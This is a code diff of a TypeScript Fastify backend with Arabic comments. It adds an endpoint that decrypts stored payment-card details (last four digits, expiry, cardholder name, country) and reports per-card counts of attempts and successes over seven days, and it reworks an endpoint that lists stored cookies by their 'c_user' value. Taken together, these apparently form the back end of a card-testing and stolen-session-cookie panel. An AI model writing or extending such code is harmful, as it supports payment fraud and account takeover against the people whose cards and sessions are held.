@@ -2,6 +2,7 @@ import type { FastifyInstance } from 'fastify';
 import { requireAuth } from '../../middleware/auth';
 import { getDb } from '../../lib/mongo';
 import { encryptJson } from '../../lib/encryption';
+import { decryptJson } from '../../lib/encryption';
 import { z } from 'zod';
 import multipart from '@fastify/multipart';
 import { parse } from 'csv-parse/sync';
@@ -145,26 +146,68 @@ export async function uploadRoutes(app: any) {
     return { items, total, page: Number(page), limit: Number(limit) };
   });
 
+  // بطاقات مع إحصائيات مبسطة لآخر 7 أيام
+  app.get('/api/cards/with-stats', { preHandler: requireAuth }, async (req: any, reply: any) => {
+    const { limit = 200 } = req.query || {};
+    const db = await getDb();
+    const limitNum = Math.max(1, Math.min(Number(limit) || 200, 500));
+    const cards = await db.collection('cards')
+      .find({})
+      .sort({ createdAt: -1 })
+      .limit(limitNum)
+      .toArray();
+
+    const cardIds = cards.map((c: any) => c._id);
+    const sevenDaysAgo = new Date(Date.now() - 7 * 24 * 60 * 60 * 1000);
+    const statsAgg = await db.collection('job_results').aggregate([
+      { $match: { cardId: { $in: cardIds as any[] }, finishedAt: { $gte: sevenDaysAgo } } },
+      { $group: { _id: '$cardId', attempts: { $sum: 1 }, successes: { $sum: { $cond: ['$success', 1, 0] } } } },
+    ]).toArray();
+    const statsMap = new Map<string, { attempts: number; successes: number }>();
+    for (const s of statsAgg) statsMap.set(String(s._id), { attempts: s.attempts || 0, successes: s.successes || 0 });
+
+    const items = cards.map((doc: any) => {
+      let details: any = undefined;
+      try {
+        const payload = decryptJson<any>(doc.payload);
+        const last4 = typeof payload?.number === 'string' ? payload.number.slice(-4) : '';
+        details = {
+          number: last4 || '',
+          exp_month: payload?.exp_month || '',
+          exp_year: payload?.exp_year || '',
+          cardholder_name: payload?.cardholder_name || payload?.cardholderName || '',
+          country: payload?.country || '',
+        };
+      } catch {}
+      const st = statsMap.get(String(doc._id)) || { attempts: 0, successes: 0 };
+      return { _id: doc._id, details, stats: st, createdAt: doc.createdAt };
+    });
+
+    return reply.send({ items });
+  });
+
   // الحصول على قائمة الكوكيز مع c_user
   app.get('/api/cookies', { preHandler: requireAuth }, async (req: any) => {
     const { limit = 100, page = 1 } = req.query || {};
     const db = await getDb();
     const skip = (Number(page) - 1) * Number(limit);
-    const raw = await db.collection('cookies')
+    const items = await db.collection('cookies')
       .find({})
+      .project({ payload: 1, createdAt: 1 })
       .sort({ createdAt: -1 })
       .skip(skip)
       .limit(Number(limit))
       .toArray();
-    const items = raw.map((doc: any) => {
+    // Map payload to minimal info
+    const mapped = items.map((doc: any) => {
       try {
-        const dec: any = JSON.parse(Buffer.from(doc.payload, 'base64').toString('utf8'));
-        return { _id: doc._id, c_user: dec.c_user ?? null, createdAt: doc.createdAt };
+        const payload = decryptJson<any>(doc.payload);
+        return { _id: doc._id, c_user: payload?.c_user || null, createdAt: doc.createdAt };
       } catch {
         return { _id: doc._id, c_user: null, createdAt: doc.createdAt };
       }
     });
     const total = await db.collection('cookies').countDocuments();
-    return { items, total, page: Number(page), limit: Number(limit) };
+    return { items: mapped, total, page: Number(page), limit: Number(limit) };
   });
 } 
